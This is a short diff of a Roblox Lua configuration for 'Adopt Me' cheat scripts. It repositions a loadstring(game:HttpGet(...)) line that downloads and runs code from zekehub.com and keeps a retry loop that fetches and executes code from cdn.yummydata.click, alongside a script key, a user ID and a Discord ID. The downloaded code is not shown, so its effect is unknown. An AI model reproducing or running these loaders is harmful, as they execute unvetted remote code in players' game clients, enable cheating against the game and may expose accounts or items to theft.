@@ -80,11 +80,9 @@ getgenv().Config = {
         },
     };
 
-loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMe/Lite.lua"))()
 getgenv().scriptkey="RASjVbIWMkcDrYbnuvrTCpnKDrJoRgId"
 
 _G.Config={UserID="80ec64fa-a261-4968-a9f3-bb22efd78528",discord_id="974162242436210698",Note="Adopt Me"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/adoptmee"))()end)if s then break end wait(5)end
 
-
-
+loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMe/Lite.lua"))()
 
